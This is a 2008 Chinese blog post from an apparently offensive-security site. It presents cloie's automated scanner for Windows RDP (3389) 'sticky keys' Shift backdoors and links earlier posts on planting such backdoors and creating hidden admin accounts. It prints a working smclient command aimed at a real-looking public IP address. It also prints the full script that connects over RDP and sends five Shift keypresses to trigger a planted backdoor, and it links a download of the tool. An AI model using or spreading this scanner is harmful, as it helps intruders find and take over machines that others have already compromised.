---
title: 3389的SHIFT后门自动扫描工具
description: 以前夜火我介绍过不少shift相关的后门文章了：XP、2003开3389+非net创建管理用户+Shift后门+自删除脚本vbs2000/xp/vista下5次shift的粘滞键利用shift后门加密版制作及不死3389帐号建立今天来看看cloie的3389的SHIFT后门自动扫描工具：首先3389的SHIFT后门极少，其次大部分SHIFT后门都加密所以手工一个一个尝试是挺傻的，写成自动扫描的话，还能让人忍受
date: 2008-09-16 08:23:16
category: 安全工具
tags: ['3389', '后门', 'Scanner']
post_id: 606
alias: 3389-shift-backdoor-Scan
ViewNums: 4336
---

以前[夜火](/blog/)我介绍过不少shift相关的后门文章了：

* [XP、2003开3389+非net创建管理用户+Shift后门+自删除脚本vbs](/blog/xp-2003-open3389-shiftbackdoor-vbs)
* [2000/xp/vista下5次shift的粘滞键利用](/blog/5shift-sethc)
* [shift后门加密版制作及不死3389帐号建立](/blog/5-shift-backdoor-3389)

今天来看看cloie的[3389的SHIFT后门自动扫描工具](/blog/3389-shift-backdoor-scan)：

首先[3389](/tags/3389)的SHIFT[后门](/tags/%E5%90%8E%E9%97%A8)极少，其次大部分SHIFT后门都加密

所以手工一个一个尝试是挺傻的，写成自动扫描的话，还能让人忍受

smclient -f:shift_backdoor.txt -s:125.91.15.254 -l:1 -v -d

shift_backdoor.txt：
job
{
connect("","","",1,1);
sleep(2000);
senddata("WM_KEYDOWN",16,2752513);
senddata("WM_KEYUP",16,3223977985);
senddata("WM_KEYDOWN",16,2752513);
senddata("WM_KEYUP",16,3223977985);
senddata("WM_KEYDOWN",16,2752513);
senddata("WM_KEYUP",16,3223977985);
senddata("WM_KEYDOWN",16,2752513);
senddata("WM_KEYUP",16,3223977985);
senddata("WM_KEYDOWN",16,2752513);
senddata("WM_KEYUP",16,3223977985);
sleep(2000);
disconnect();
}

有些SHIFT后门被改成了按7次SHIFT，或者是WIN+U后门，改改shift_backdoor.txt把功能加进去即可

[3389的SHIFT后门自动扫描工具 下载地址](/blog/download.asp?id=151

From:[cloie](http://hi.baidu.com/cloie)

